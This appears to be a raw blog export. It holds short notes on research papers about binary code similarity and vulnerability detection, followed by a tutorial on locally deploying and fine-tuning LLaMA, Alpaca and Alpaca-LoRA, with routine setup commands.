<tr>
<th><a class="link"   href="https://keenlab.tencent.com/en/whitepapers/Ordermatters.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th>repo</th>
<th>AAAi 2020</th>
</tr>
</thead>
</table>
<p>Propose an overall framework with three components: <strong>semantic-aware modeling</strong>, <strong>structural-aware modeling</strong>, and <strong>order-aware modeling</strong>.</p>
<p><img src="/./imghost/bcsdp/order1.png" alt="Overall structure of our model"></p>
<p>Semantic-aware Modeling:<br>    - propose a <em>BERT</em> pretraining model with 4 tasks for dealing with CFGs<br>    - have one <em>token-level</em> task(<strong>Masked language model, MLM</strong>), one <em>block-level</em> task(<strong>Adjacency node prediction, ANP</strong>) and two <em>graph-level</em> tasks(<strong>block inside graph task, BIG</strong>, and <strong>graph classification task, GC</strong>).<br>    the inputs are block-level, dont know the seperator between instruction.</p>
<p><img src="/./imghost/bcsdp/order2.png" alt="Bert with 4 tasks: MLM, ANP, BIG and GC"></p>
<p>Structural-aware Modeling:<br>    - use <em>MPNN</em> (message passing neural network) to compute <strong>graph semantic &amp; structural embedding</strong> of each CFG</p>
<p>Order-aware Modeling:<br>    - use CNN<br>    - use a 11-layer <em>Resnet</em> with 3 residual blocks.<br>    - use a global max pooling layer (last layer) to compute the <strong>graph order embedding</strong>.</p>
<p><img src="/./imghost/bcsdp/order3.png" alt="Example graphs and their adjacency matrices"></p>
<h2 id="PalmTree-Learning-an-Assembly-Language-Model-for-Instruction-Embedding"><a href="#PalmTree-Learning-an-Assembly-Language-Model-for-Instruction-Embedding" class="headerlink" title="PalmTree: Learning an Assembly Language Model for Instruction Embedding"></a>PalmTree: Learning an Assembly Language Model for Instruction Embedding</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://dl.acm.org/doi/pdf/10.1145/3460120.3484587" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th><a class="link"   href="https://www.inforsec.org/wp/wp-content/uploads/2021/07/qy.pdf" >slide<i class="fas fa-external-link-alt"></i></a></th>
<th>video</th>
<th><a class="link"   href="https://github.com/palmtreemodel/PalmTree" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>CCS 2021</th>
</tr>
</thead>
</table>
<p>Propose PalmTree model, Modify <em>BERT</em>, create <strong>(x86) assembly tokenization method</strong>, design <strong>Masked Language Model (MLM)</strong>, <strong>Context Window Prediction (CWP)</strong> and <strong>Figure 5: Def-Use Prediction (DUP)</strong>.<br>Try downstream tasks about <em>Binary code similarity detection</em>, <em>Function type signature analysis</em>, and <em>Value set analysis</em>.</p>
<p><img src="/./imghost/bcsdp/palmtree.png" alt="System design of PalmTree"></p>
<h2 id="Patch-Based-Vulnerability-Matching-for-Binary-Programs"><a href="#Patch-Based-Vulnerability-Matching-for-Binary-Programs" class="headerlink" title="Patch Based Vulnerability Matching for Binary Programs"></a>Patch Based Vulnerability Matching for Binary Programs</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://faculty.sist.shanghaitech.edu.cn/faculty/songfu/publications/ISSTA20.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th>repo</th>
<th>ISSTA 2020</th>
</tr>
</thead>
</table>
<p>Propose the Binary X-Ray (BinXray), a patch based vulnerability matching approach.</p>
<ol>
<li>target function matching<br> use synatic and structural info, not the contribution, similar to other existing approaches</li>
<li>patch signature generation<ul>
<li>propose a <strong>basic block mapping algorithm</strong> to generate patch signatures, represented as <strong>sets of basic block traces</strong> – sequences of consecutive bbs.</li>
<li>create mapping between basic blocks of 2 funcs (vulnerable and patched), two trace sets are regarded as a patch signature.</li>
</ul>
</li>
<li>patch presence identification<br> compare <strong>target</strong> func with <strong>vulnerable</strong> func and <strong>patched</strong> func and check which one is closer.</li>
</ol>
<p><img src="/./imghost/bcsdp/patchbased.png" alt="Overview of BinXray"></p>
<h2 id="SAFE-Self-Attentive-Function-Embeddings-for-Binary-Similarity"><a href="#SAFE-Self-Attentive-Function-Embeddings-for-Binary-Similarity" class="headerlink" title="SAFE: Self-Attentive Function Embeddings for Binary Similarity"></a>SAFE: Self-Attentive Function Embeddings for Binary Similarity</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://arxiv.org/pdf/1811.05296.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th><a class="link"   href="https://www.dimva2019.org/wp-content/uploads/sites/31/2019/06/DIMVA19-Slides-22.pdf" >slide<i class="fas fa-external-link-alt"></i></a></th>
<th>video</th>
<th>repo</th>
<th>DIMVA 2019</th>
</tr>
</thead>
</table>
<p>2 perids:</p>
<ol>
<li>Assembly instruction embedding (i2v)</li>
<li>Self-attention neural network (GRU RNN)</li>
</ol>
<p><img src="/./imghost/bcsdp/safe1.png" alt="Architecture of SAFE"></p>
<p>Self-Attentive Network: detailed architecture<br><img src="/./imghost/bcsdp/safe2.png" alt="Self-Attentive Network: detailed architecture"><br><img src="/./imghost/bcsdp/safe3.png" alt="Siamese network"></p>
<h2 id="Similarity-Metric-Method-for-Binary-Basic-Blocks-of-Cross-Instruction-Set-Architecture"><a href="#Similarity-Metric-Method-for-Binary-Basic-Blocks-of-Cross-Instruction-Set-Architecture" class="headerlink" title="Similarity Metric Method for Binary Basic Blocks of Cross-Instruction Set Architecture"></a>Similarity Metric Method for Binary Basic Blocks of Cross-Instruction Set Architecture</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://www.ndss-symposium.org/wp-content/uploads/bar2020-23002.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th><a class="link"   href="https://github.com/zhangxiaochuan/MIRROR" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>NDSS Workshop of BAR 2020</th>
</tr>
</thead>
</table>
<p>Propose a cross-ISA oriented solution for basic block embedding, specify <em>x86</em> and <em>ARM</em> for the sake of description.<br>The <em>NMT</em> model used is not limited to <em>Transformer</em> only, but any <em>NMT</em> models of <em>seq2seq</em> architecture.</p>
<p>To map <em>x86</em> and <em>ARM</em> basic blocks into same embedding vector space, first train an <em>NMT</em> model which translates <em>x86</em> basic blocks into the corresponding ARM basic blocks. </p>
<p><img src="/./imghost/bcsdp/similaritymetric1.png" alt="The idealized solution of the embedding neural network"></p>
<p>However the idealized model is almost impossible in practice, therefore futher fine-tune.</p>
<p><img src="/./imghost/bcsdp/similaritymetric2.png" alt="Illustration of the two training phases of the practical solution"></p>
<ul>
<li>The encoder of the trained <em>NMT</em> model is served as <strong>x86-encoder</strong>.</li>
<li>Then fix the <strong>x86-encoder</strong> and train an <strong>ARM-encoder</strong> to map <em>ARM</em> basic blocks close to the <strong>same vector space</strong> of x86 basic block embeddings.</li>
<li>Since the <strong>x86-encoder</strong> trained in the translation phase is definitely biased, further fine-tune the <strong>x86-encoder</strong> during the <strong>ARM-encoder</strong> training.</li>
</ul>
<h2 id="SPAIN-Security-Patch-Analysis-for-Binaries-Towards-Understanding-the-Pain-and-Pills"><a href="#SPAIN-Security-Patch-Analysis-for-Binaries-Towards-Understanding-the-Pain-and-Pills" class="headerlink" title="SPAIN: Security Patch Analysis for Binaries Towards Understanding the Pain and Pills"></a>SPAIN: Security Patch Analysis for Binaries Towards Understanding the Pain and Pills</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://faculty.sist.shanghaitech.edu.cn/faculty/songfu/publications/icse17.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th>repo</th>
<th>ICSE 2017</th>
</tr>
</thead>
</table>
<p>Propose a scalable binary-level patch analysis framework, named <strong>SPAIN</strong>, which can automatically identify security patches and summarize patch patterns and their corresponding vulnerability patterns. </p>
<p><img src="/./imghost/bcsdp/spain1.png" alt="Framework Overview of SPAIN"></p>
<p>Specifically, given the original and patched versions of a binary program, </p>
<ol>
<li>we <strong>locate the patched functions and identify the changed traces</strong> (i.e., a sequence of basic blocks) that may contain security or non-security patches. <ul>
<li>Function Matching: IDA Pro and BinDiff </li>
<li>Function Filtering: remove function with no changes to reduce analysis size, merge blocks with single successor&#x2F;predecessor and normalize basic blocks</li>
</ul>
</li>
</ol>
<p><img src="/./imghost/bcsdp/spain2.png" alt="An Example of the Original and Patched Functions"></p>
<ol start="2">
<li>Then we <strong>identify security patches</strong> through a semantic analysis of these traces and <em>summarize the patterns</em> through a taint analysis on the patched functions. <ul>
<li>identify by pairwise basic block matching</li>
<li>if a bb is not matched in another func, it is patched</li>
</ul>
</li>
</ol>
<p><img src="/./imghost/bcsdp/spain3.png" alt="Abstract Vulnerability and Security Patch Pattern"></p>
<ol start="3">
<li>The summarized patterns can be used to <strong>search similar patches or vulnerabilities</strong> in binary programs.<ul>
<li>perform a semantic analysis on both the <strong>patched partial trace</strong> and the set of <strong>original partial traces</strong></li>
<li>see whether it’s security related</li>
</ul>
</li>
</ol>
<h2 id="TREX-Learning-Execution-Semantics-from-Micro-Traces-for-Binary-Similarity"><a href="#TREX-Learning-Execution-Semantics-from-Micro-Traces-for-Binary-Similarity" class="headerlink" title="TREX: Learning Execution Semantics from Micro-Traces for Binary Similarity"></a>TREX: Learning Execution Semantics from Micro-Traces for Binary Similarity</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://www.cs.columbia.edu/~suman/docs/trex_final.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th><a class="link"   href="https://arxiv.org/pdf/2012.08680.pdf" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>Arxiv 2020</th>
</tr>
</thead>
</table>
<p>TREX (TRansfer-learning EXecution semantics)<br>use pre-train model (hierarchical Transformer) to learn dynamic micro-trace (including sequences of executed instruction), then get execution semantics.</p>
<p><img src="/./imghost/bcsdp/trex1.png" alt="The workflow of TREX"></p>
<p>inputs to Transformer include 5 kinds of token sequence with same length:</p>
<ol>
<li>micro-trace code sequence (only opcode)</li>
<li>micro-trace value sequence (only explicit value,but dynamic)</li>
<li>Position sequence (instruction and opcode&#x2F;oprand position sequence)</li>
<li>Architecture sequence</li>
<li>Encoding numeric values (using bi-LSTM to reduce vocabulary size, processing micro-trace value sequence)</li>
</ol>
<p><img src="/./imghost/bcsdp/trex2.png" alt="Model architecture with input-output example"></p>
<h2 id="VIVA-Binary-Level-Vulnerability-Identification-via-Partial-Signature"><a href="#VIVA-Binary-Level-Vulnerability-Identification-via-Partial-Signature" class="headerlink" title="VIVA: Binary Level Vulnerability Identification via Partial Signature"></a>VIVA: Binary Level Vulnerability Identification via Partial Signature</h2><table>
<thead>
<tr>
<th><a class="link"   href="https://sci-hub.ru/10.1109/SANER50967.2021.00028" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th>repo</th>
<th>SANER 2021</th>
</tr>
</thead>
</table>
<p>Propose <em><strong>VIVA</strong></em>, a <em>binary level</em> <em>vulnerability and patch</em> semantic summarization and matching tool for accurate recurring vulnerability detection.</p>
<p><img src="/./imghost/bcsdp/viva.png" alt="Overview of VIVA"></p>
<p>Use novel <strong>binary program slicing techniques</strong> with the aid of <strong>pseudo-code trace refinement</strong> to generate <strong>partial vulnerability and patch signatures</strong>, which capture the semantics.<br>It matches the signatures between <strong>partial program traces</strong> (instead of <strong>binary functions</strong>) with <strong>pre-filtering</strong> to efficiently detect 1-day and recurring vulnerabilities.</p>
<p>signatures and traces are also instruction sequences.</p>
<h2 id="VulSeeker-A-Semantic-Learning-Based-Vulnerability-Seeker-for-Cross-Platform-Binary"><a href="#VulSeeker-A-Semantic-Learning-Based-Vulnerability-Seeker-for-Cross-Platform-Binary" class="headerlink" title="VulSeeker: A Semantic Learning Based Vulnerability Seeker for Cross-Platform Binary"></a>VulSeeker: A Semantic Learning Based Vulnerability Seeker for Cross-Platform Binary</h2><table>
<thead>
<tr>
<th><a class="link"   href="http://wingtecher.com/themes/WingTecherResearch/assets/papers/ase18-vulseeker.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th><a class="link"   href="https://github.com/buptsseGJ/VulSeeker" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>ASE 2018</th>
</tr>
</thead>
</table>
<p>Improve <em><strong>Gemini</strong></em>, using <em>LSFG</em>(<em>CFG</em> + <em>DFG</em>) to replace <em>ACFG</em>.</p>
<p><img src="/./imghost/bcsdp/vulseeker1.png" alt="VulSeeker design"><br><img src="/./imghost/bcsdp/vulseeker2.png" alt="The DNN model of VulSeeker"></p>
<h2 id="VulSeeker-Pro-Enhanced-Semantic-Learning-Based-Binary-Vulnerability-Seeker-with-Emulation"><a href="#VulSeeker-Pro-Enhanced-Semantic-Learning-Based-Binary-Vulnerability-Seeker-with-Emulation" class="headerlink" title="VulSeeker-Pro: Enhanced Semantic Learning Based Binary Vulnerability Seeker with Emulation"></a>VulSeeker-Pro: Enhanced Semantic Learning Based Binary Vulnerability Seeker with Emulation</h2><table>
<thead>
<tr>
<th><a class="link"   href="http://wingtecher.com/themes/WingTecherResearch/assets/papers/fse18-vulseeker-pro.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th>repo</th>
<th>ESEC&#x2F;FSE 2018</th>
</tr>
</thead>
</table>
<p>In addition to <em><strong>VulSeeker</strong></em> …</p>
<p>Emulation Engine:</p>
<ul>
<li>Argument Recognition<br>first needs to recognize the arguments of the function </li>
<li>Function Emulation<br>use pyvex to perform function emulation, and records dynamic execution trace<br>features&#x2F; semantic signature x4:</li>
</ul>
<ol>
<li>input values</li>
<li>output values</li>
<li>comparison opcodes&#x2F;oprands</li>
<li>library function calls</li>
</ol>
<ul>
<li>Reordering Calculation<br>use Jaccard similarity coefficient</li>
</ul>
<p>but what exactly is the sequence, and how Jaccard similarity coefficient calculate (with character sequence or number seq.?)</p>
<p><img src="/./imghost/bcsdp/vulseekerpro1.png" alt="Overall workflow of VulSeeker-Pro"><br><img src="/./imghost/bcsdp/vulseekerpro2.png" alt="The semantic learning model of VulSeeker-Pro"></p>
<h2 id="Semantic-Learning-and-Emulation-Based-Cross-platform-Binary-Vulnerability-Seeker"><a href="#Semantic-Learning-and-Emulation-Based-Cross-platform-Binary-Vulnerability-Seeker" class="headerlink" title="Semantic Learning and Emulation Based Cross-platform Binary Vulnerability Seeker"></a>Semantic Learning and Emulation Based Cross-platform Binary Vulnerability Seeker</h2><table>
<thead>
<tr>
<th><a class="link"   href="http://wingtecher.com/themes/WingTecherResearch/assets/papers/TSE19.pdf" >paper<i class="fas fa-external-link-alt"></i></a></th>
<th>slide</th>
<th>video</th>
<th><a class="link"   href="https://github.com/buptsseGJ/BinSeeker" >repo<i class="fas fa-external-link-alt"></i></a></th>
<th>TSE 2019</th>
</tr>
</thead>
</table>
<p>Same as <em><strong>VulSeeker-Pro</strong></em>, but extend to support other architectures (right?)</p>
<p><img src="/./imghost/bcsdp/binseeker.png" alt="Overall workflow of BinSeeker"></p>
]]></content>
      <categories>
        <category>Papers</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>linux</tag>
        <tag>bcsd</tag>
      </tags>
  </entry>
  <entry>
    <title>Deploy Some LLMs</title>
    <url>/2023/05/08/Deploy-Some-LLMs/</url>
    <content><![CDATA[<p>Large Language Models (<code>LLMs</code>) are neural networks with many parameters (typically billions or more) that are trained on large quantities of text using self-supervised or semi-supervised learning. <code>LLMs</code> can perform well at a wide variety of natural language processing tasks, such as text generation, text classification, question answering, and machine translation. <code>LLMs</code> can also capture the syntax, semantics, and general knowledge of human language, and demonstrate some special abilities that are not present in small-scale language models. Some examples of <code>LLMs</code> are <code>GPT-3</code>, <code>BERT</code>, <code>T5</code>, and <code>ChatGPT</code>.<br>(Powered by New Bing)</p>
<p>As <code>LLM</code>(especially <code>ChatGPT</code>) is gaining popularity, an overnight sensation, the related technologies grows so fast. We better integrate <code>LLM</code> into our workflow as soon as possible, to keep up with this trend and increase work efficiency in a solid way.</p>
<p>To do researches, deploying the model locally seems better than just using provided <code>API</code> online. For personal researchers, we can only use consumer-level GPU to do inference, so here I introduce some open-source or lightweight models that I deployed before.</p>
<h2 id="LLaMA"><a href="#LLaMA" class="headerlink" title="LLaMA"></a>LLaMA</h2><p>Here is the <a class="link"   href="https://github.com/facebookresearch/llama" >official repo<i class="fas fa-external-link-alt"></i></a> from Facebook (now Meta), the codes and academic paper are open-source, but the models need to fill a <a class="link"   href="https://forms.gle/jk851eBVbX1m5TAv5" >form<i class="fas fa-external-link-alt"></i></a> to request online.</p>
<p>Actually the applied models can only be loaded by model source code in official repo above, while the community convert <code>LLaMA</code> original weights to Hugginface format (like <a class="link"   href="https://huggingface.co/decapoda-research" >Decapoda Research hf page<i class="fas fa-external-link-alt"></i></a>), and there are some universal toolkit like <a class="link"   href="https://github.com/oobabooga/text-generation-webui" >text-generation-webui<i class="fas fa-external-link-alt"></i></a> to load <code>LLaMA</code> and some other models easily.</p>
<p>Visit <a class="link"   href="https://github.com/oobabooga/text-generation-webui/blob/main/docs/LLaMA-model.md" >text-generation-webui&#x2F;docs&#x2F;LLaMA-model.md<i class="fas fa-external-link-alt"></i></a> to see how to load <code>LLaMA</code> in <code>text-generation-webui</code>.</p>
<p>First of all prepare the <code>Linux</code> environment including <code>Nvidia GPU Driver</code> and <code>Conda</code>.<br>Then prepare textgen conda environment</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ conda create -n textgen python=3.10.9</span><br><span class="line">$ conda activate textgen</span><br></pre></td></tr></table></figure>
<p>Install the web UI</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/oobabooga/text-generation-webui</span><br><span class="line">$ <span class="built_in">cd</span> text-generation-webui</span><br><span class="line">$ pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
<p>Download the model</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># `download-model.py` is a good script to download models from hugginface</span></span><br><span class="line"><span class="comment"># use `python download-model.py organization/model` like:</span></span><br><span class="line">$ python download-model.py decapoda-research/llama-7b-hf</span><br><span class="line"><span class="comment"># the target model will be saved in `models/` foder</span></span><br><span class="line">$ ls models/</span><br><span class="line">config.yaml                                   decapoda-research_llama-7b-hf</span><br><span class="line">place-your-models-here.txt</span><br></pre></td></tr></table></figure>
<p>Start with specific model</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python server.py --model llama-7b</span><br></pre></td></tr></table></figure>
<p>Note that if you want to load some 4-bit models like <a class="link"   href="https://huggingface.co/Neko-Institute-of-Science/LLaMA-7B-4bit-128g/tree/main" >Neko-Institute-of-Science&#x2F;LLaMA-7B-4bit-128g<i class="fas fa-external-link-alt"></i></a> from <a class="link"   href="https://huggingface.co/Neko-Institute-of-Science" >Bonanza Unthread<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://github.com/oobabooga/text-generation-webui/blob/main/docs/GPTQ-models-(4-bit-mode).md" >extra steps<i class="fas fa-external-link-alt"></i></a> may need.</p>
<h3 id="Alpaca"><a href="#Alpaca" class="headerlink" title="Alpaca"></a>Alpaca</h3><p><a class="link"   href="https://github.com/tatsu-lab/stanford_alpaca" >Stanford Alpaca<i class="fas fa-external-link-alt"></i></a> is an instruction-following language model that is fine-tuned from Meta’s LLaMA 7B model. It is developed by researchers at Stanford CRFM and can perform various tasks based on natural language instructions. </p>
<p>The current <code>Alpaca</code> model is fine-tuned from a 7B LLaMA model on 52K instruction-following data generated by the Self-Instruct techniques. In a preliminary human evaluation, <code>Alpaca</code> 7B model behaves similarly to the <code>text-davinci-003</code> model on the Self-Instruct instruction-following evaluation suite.</p>
<p>The most valuable part is its fine-tuning script, which for the first time gives us a chance to finetune the LLM. </p>
<p>First of all prepare the environment</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/tatsu-lab/stanford_alpaca</span><br><span class="line">$ <span class="built_in">cd</span> stanford_alpaca</span><br><span class="line">$ conda create -n stanford python=3.10</span><br><span class="line">$ conda activate stanford</span><br><span class="line">$ pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
<p>Prepare LLaMA weights, here introduce several ways</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get through `git clone`</span></span><br><span class="line">$ git lfs install</span><br><span class="line">$ git <span class="built_in">clone</span> https://huggingface.co/decapoda-research/llama-7b-hf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pyllama also provides methods</span></span><br><span class="line">$ pip install pyllama -U</span><br><span class="line">$ python -m llama.download --model_size 7B,30B --folder /tmp/pyllama_data</span><br><span class="line"><span class="comment"># more at https://github.com/juncongmoo/pyllama</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># more universal method is using huggingface_hub</span></span><br><span class="line">$ pip install huggingface_hub</span><br><span class="line">$ ipython</span><br><span class="line">...</span><br><span class="line">In [1]: from huggingface_hub import snapshot_download</span><br><span class="line"></span><br><span class="line">In [2]: snapshot_download(repo_id=<span class="string">&#x27;decapoda-research/llama-7b-hf&#x27;</span>)</span><br><span class="line">Fetching 42 files: 100%|██████████████████████████████████████████████████████████████████████| 42/42 [00:00&lt;00:00, 8660.38it/s]</span><br><span class="line">Out[3]: <span class="string">&#x27;/path/to/.cache/huggingface/hub/models--decapoda-research--llama-7b-hf/snapshots/5f98eefcc80e437ef68d457ad7bf167c2c6a1348&#x27;</span></span><br><span class="line"><span class="comment"># finally model saved in `~/.cache/huggingface/hub/models--decapoda-research--llama-7b-hf/snapshots/5f98eefcc80e437ef68d457ad7bf167c2c6a1348`</span></span><br><span class="line"><span class="comment"># the `AutoModel.from_pretrained()` is theoretically feasible as well</span></span><br></pre></td></tr></table></figure>
<p>Then finetune</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">### parallel works</span></span><br><span class="line">$ torchrun --nproc_per_node=2 --master_port=12345 train.py \</span><br><span class="line">    --model_name_or_path ~/.cache/huggingface/hub/models--decapoda-research--llama-7b-hf/snapshots/5f98eefcc80e437ef68d457ad7bf167c2c6a1348/ \</span><br><span class="line">    --data_path ./alpaca_data.json \</span><br><span class="line">    --bf16 True \</span><br><span class="line">    --output_dir ./output_model_path \</span><br><span class="line">    --num_train_epochs 1 \</span><br><span class="line">    --per_device_train_batch_size 1 \</span><br><span class="line">    --per_device_eval_batch_size 1 \</span><br><span class="line">    --gradient_accumulation_steps 1 \</span><br><span class="line">    --evaluation_strategy <span class="string">&quot;no&quot;</span> \</span><br><span class="line">    --save_strategy <span class="string">&quot;steps&quot;</span> \</span><br><span class="line">    --save_steps 1 \</span><br><span class="line">    --save_total_limit 1 \</span><br><span class="line">    --learning_rate 2e-5 \</span><br><span class="line">    --weight_decay 0. \</span><br><span class="line">    --warmup_ratio 0.03 \</span><br><span class="line">    --lr_scheduler_type <span class="string">&quot;cosine&quot;</span> \</span><br><span class="line">    --logging_steps 1 \</span><br><span class="line">    --fsdp <span class="string">&quot;full_shard auto_wrap&quot;</span> \</span><br><span class="line">    --fsdp_transformer_layer_cls_to_wrap <span class="string">&#x27;LLaMADecoderLayer&#x27;</span> \</span><br><span class="line">    --tf32 True</span><br><span class="line"></span><br><span class="line"><span class="comment">### single card works</span></span><br><span class="line">$ python train.py \</span><br><span class="line">    --model_name_or_path ~/.cache/huggingface/hub/models--decapoda-research--llama-7b-hf/snapshots/5f98eefcc80e437ef68d457ad7bf167c2c6a1348/ \</span><br><span class="line">    --data_path ./alpaca_data.json \</span><br><span class="line">    --bf16 True \</span><br><span class="line">    --output_dir ./output_model_path \</span><br><span class="line">    --num_train_epochs 1 \</span><br><span class="line">    --per_device_train_batch_size 1 \</span><br><span class="line">    --per_device_eval_batch_size 1 \</span><br><span class="line">    --gradient_accumulation_steps 1 \</span><br><span class="line">    --evaluation_strategy <span class="string">&quot;no&quot;</span> \</span><br><span class="line">    --save_strategy <span class="string">&quot;steps&quot;</span> \</span><br><span class="line">    --save_steps 1 \</span><br><span class="line">    --save_total_limit 1 \</span><br><span class="line">    --learning_rate 2e-5 \</span><br><span class="line">    --weight_decay 0. \</span><br><span class="line">    --warmup_ratio 0.03 \</span><br><span class="line">    --lr_scheduler_type <span class="string">&quot;cosine&quot;</span> \</span><br><span class="line">    --logging_steps 1 \</span><br><span class="line">    --tf32 True</span><br><span class="line"></span><br><span class="line"><span class="comment">### train from scratch</span></span><br><span class="line"><span class="comment"># $ python train.py \</span></span><br><span class="line"><span class="comment">#     --data_path ./alpaca_data.json \</span></span><br><span class="line"><span class="comment">#     --output_dir ./output_model_path </span></span><br></pre></td></tr></table></figure>
<p>And we will meet <code>ValueError: Tokenizer class LLaMATokenizer does not exist or is not currently imported.</code>, which can be solved by <a class="link"   href="https://github.com/huggingface/transformers/issues/22222" >huggingface&#x2F;transformers#22222 (comment)<i class="fas fa-external-link-alt"></i></a>.</p>
<p>To solve it, replace <code>LLaMATokenizer</code> in <code>tokenizer_config.json</code> of <code>decapoda-research/llama-7b-hf</code> with <code>LlamaTokenizer</code><br>Or try another branch of transformers</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pip install git+https://github.com/mbehm/transformers</span><br></pre></td></tr></table></figure>
<p>Then we can run this successfully.<br>Sadly it requires <code>more than 40 GB memory</code> of a single graphics card, the consumer GPUs out (even RTX 4090 only gets 24 GB memory for now).</p>
<h3 id="Alpaca-Lora"><a href="#Alpaca-Lora" class="headerlink" title="Alpaca Lora"></a>Alpaca Lora</h3><p>There are more lightweight ways to run <code>LLaMA</code> or <code>Alpace</code> models like <a class="link"   href="https://github.com/ggerganov/llama.cpp" >ggerganov&#x2F;llama.cpp<i class="fas fa-external-link-alt"></i></a>, but the <a class="link"   href="https://github.com/tloen/alpaca-lora" >Alpaca-LoRA<i class="fas fa-external-link-alt"></i></a> brings the capability of training LLM to consumer GPUs for real.</p>
<p><a class="link"   href="https://github.com/tloen/alpaca-lora" >This repository<i class="fas fa-external-link-alt"></i></a> contains code for reproducing the Stanford Alpaca results using low-rank adaptation (LoRA). LoRA makes it possible to train and finetune on RTX 3090 and so on, though the finetuned models are just average.</p>
<p>Prepare the environment</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/tloen/alpaca-lora</span><br><span class="line">$ <span class="built_in">cd</span> alpaca-lora</span><br><span class="line">$ conda create -n lora python=3.10</span><br><span class="line">$ conda activate lora</span><br><span class="line">$ pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<p><strong>Training</strong> (finetune.py)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python finetune.py \</span><br><span class="line">    --base_model <span class="string">&#x27;decapoda-research/llama-7b-hf&#x27;</span> \</span><br><span class="line">    --data_path <span class="string">&#x27;./alpaca_data.json&#x27;</span> \</span><br><span class="line">    --output_dir <span class="string">&#x27;./lora-alpaca&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># even hyperparams</span></span><br><span class="line">$ python finetune.py \</span><br><span class="line">    --base_model <span class="string">&#x27;decapoda-research/llama-7b-hf&#x27;</span> \</span><br><span class="line">    --data_path <span class="string">&#x27;./alpaca_data.json&#x27;</span> \</span><br><span class="line">    --output_dir <span class="string">&#x27;./lora-alpaca&#x27;</span> \</span><br><span class="line">    --batch_size 128 \</span><br><span class="line">    --micro_batch_size 4 \</span><br><span class="line">    --num_epochs 3 \</span><br><span class="line">    --learning_rate 1e-4 \</span><br><span class="line">    --cutoff_len 512 \</span><br><span class="line">    --val_set_size 2000 \</span><br><span class="line">    --lora_r 8 \</span><br><span class="line">    --lora_alpha 16 \</span><br><span class="line">    --lora_dropout 0.05 \</span><br><span class="line">    --lora_target_modules <span class="string">&#x27;[q_proj,v_proj]&#x27;</span> \</span><br><span class="line">    --train_on_inputs \</span><br><span class="line">    --group_by_length</span><br></pre></td></tr></table></figure>
<p>Here got two problems, one for loading <code>decapoda-research/llama-7b-hf</code> using newest <code>transformers</code> like above, which can be solved as above.<br>Another is about <code>bitsandbytes</code>, see <a class="link"   href="https://github.com/tloen/alpaca-lora/issues/46#issuecomment-1474343963" >issue46<i class="fas fa-external-link-alt"></i></a>.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># error goes like:</span></span><br><span class="line">AttributeError: /path/to/miniconda3/envs/lora/lib/python3.10/site-packages/bitsandbytes/libbitsandbytes_cpu.so: undefined symbol: cget_col_row_stats</span><br><span class="line"><span class="comment"># to solve it,</span></span><br><span class="line">$ <span class="built_in">cd</span> /path/to/miniconda3/envs/lora/lib/python3.10/site-packages/bitsandbytes/</span><br><span class="line">$ cp libbitsandbytes_cuda117.so libbitsandbytes_cpu.so <span class="comment"># cuda version should bu choose according to detailed error messages</span></span><br></pre></td></tr></table></figure>
<p>Eventually <code>finetune.py</code> runs.</p>
<p><strong>Inference</strong> (generate.py)</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python generate.py \</span><br><span class="line">    --load_8bit \</span><br><span class="line">    --base_model <span class="string">&#x27;decapoda-research/llama-7b-hf&#x27;</span> \</span><br><span class="line">    --lora_weights <span class="string">&#x27;tloen/alpaca-lora-7b&#x27;</span></span><br></pre></td></tr></table></figure>
<p>A gradio web page is available. Both the published LoRA weights and the models you finetuned can be hosted.</p>
